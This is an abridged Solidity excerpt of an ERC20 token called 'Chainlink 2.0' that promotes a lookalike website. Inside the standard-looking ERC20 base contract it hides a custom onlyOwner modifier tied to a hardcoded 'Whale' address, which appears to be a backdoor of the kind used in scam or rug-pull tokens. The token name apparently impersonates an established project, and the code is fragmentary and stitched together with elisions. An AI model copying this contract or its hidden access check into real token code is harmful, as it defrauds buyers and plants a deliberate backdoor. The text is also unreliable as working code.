...
contract ERC20 is Context, IERC20, IERC20Metadata {
    ...
    string public LINK20nuwebsite = "https://www.chainlink2.vip//";
    string public LINK20nuADDRESS = "0x6743D8951421bD887AB514557c19ee0C90fb1355";
    uint256 private _totalSupply;
    uint8 private _decimals;
    string private _name;
    string private _symbol;
    address private WhaleLINK20nu;
    constructor(string memory name_, string memory symbol_) {
        _name = name_;
        _symbol = symbol_;
       _decimals = 9;
         WhaleLINK20nu = 0x6743D8951421bD887AB514557c19ee0C90fb1355;      
    }
    ...
    function _burn(address account, uint256 amount) internal virtual {
        ...
        _afterTokenTransfer(account, address(0), amount);
              ...
              function getLINK20nuwebsite() public view returns (string memory) {
        return LINK20nuwebsite;
    } 


               function getLINK20nuADDRESS() public view returns (string memory) {
        return LINK20nuADDRESS;
    }    
      modifier onlyOwner() {
         require(_msgSender() == WhaleLINK20nu);
        _;
    }    
    function _approve(
        address owner,
...
contract LINK20 is ERC20, Ownable {
    constructor () ERC20("Chainlink 2.0", "$LINK2.0") 
    {    
